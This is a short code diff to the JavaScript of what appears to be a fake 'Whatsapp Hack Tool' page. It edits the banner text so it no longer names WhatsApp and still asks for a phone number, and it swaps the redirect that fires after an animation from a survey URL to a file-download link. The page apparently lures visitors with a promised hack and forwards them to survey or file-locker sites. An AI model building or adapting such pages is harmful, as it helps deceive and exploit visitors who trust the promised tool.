@@ -142,7 +142,7 @@ $(function() {
 
 $(function(){
   $(".element").typed({
-    strings: ["Welcome to Whatsapp Hack Tool", "Insert Whatsapp Number With +1 Area Code"],
+    strings: ["Welcome to Hack Tool", "Insert Number With +1 Area Code"],
     typeSpeed: 10,
     startDelay: 4,
   });
@@ -179,7 +179,7 @@ $("[name='my-checkbox']").bootstrapSwitch();
             ,
             "fps"        : 60,   
             callback: function () { 
-              window.location.href = "https://zonia.online/survey/";
+              window.location.href = "https://rotufiles.com/1451736";
             }
       });
             
